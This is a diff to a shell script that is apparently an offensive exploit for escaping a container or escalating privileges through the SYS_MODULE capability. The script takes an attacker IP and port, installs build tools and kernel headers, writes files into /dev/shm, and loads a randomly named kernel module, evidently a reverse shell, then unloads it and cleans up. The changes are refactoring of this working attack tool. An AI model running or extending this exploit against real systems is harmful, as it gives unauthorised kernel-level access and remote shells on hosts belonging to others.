@@ -1,10 +1,12 @@
 #!/bin/sh
+ip=$1
+port=$2
+installRequiredFiles=$3
 
 install_with_pkg()
 {
     arg1=$1
-    echo $arg1
-    
+
     echo "[+] Running update: $arg1 update."
     $arg1 -y update
 
@@ -13,6 +15,9 @@ install_with_pkg()
 
     echo "[+] Installing inosmod: $arg1 install kmod."
     $arg1 -y install kmod
+
+    echo "[+] Installing linux-headers: $arg1 install -y build-essential linux-headers-$(uname -r)."
+    $arg1 install -y build-essential linux-headers-$(uname -r)
 }
 
 
@@ -20,16 +25,12 @@ exploitSysModule(){
   RED=$(tput bold)$(tput setaf 1)
   DEFAULT_COLOR=$(tput sgr0)
 
-  ip=$1
-  port=$2
-  installRequiredFiles=$3
-  
-  echo "[i] Exploiting SYS_MODULE"
-  echo $ip
-  echo $port
-  echo $installRequiredFiles
 
-  if [ $installRequiredFiles = "true" ]; then
+
+  echo "[i] Exploiting SYS_MODULE"
+
+
+  if [ "$installRequiredFiles" = true ]; then
       if [ -x "$(command -v apt)" ]; then
   	  install_with_pkg "apt"
   	elif [ -x "$(command -v yum)" ]; then
@@ -45,7 +46,7 @@ exploitSysModule(){
       echo "[!] make is required to run this exploit."
       exit 1
     fi
-  
+
     if ! [ -x "$(command -v insmod)" ]; then
       echo "[!] insmod is required to run this exploit."
       exit 1
@@ -79,9 +80,10 @@ exploitSysModule(){
 #  fi
 
   module_name=$(tr -dc A-Za-z </dev/urandom | head -c 13)
+  echo "kernel module name $module_name"
   sys_cwd=$(pwd)
 
-  mkdir /dev/shm/rev && cd /dev/shm/rev || exit 1
+  ([ -d "/dev/shm/rev" ] || mkdir /dev/shm/rev) && cd /dev/shm/rev || exit 1
 
   echo "[i] Writing scripts..."
 
@@ -133,6 +135,9 @@ EOF
   fi
 
   echo "[i] Cleaning up..."
+  if  [ -x "$(command -v rmmod)" ]; then
+    rmmod $module_name
+  fi
 
   rm -r /dev/shm/rev
 
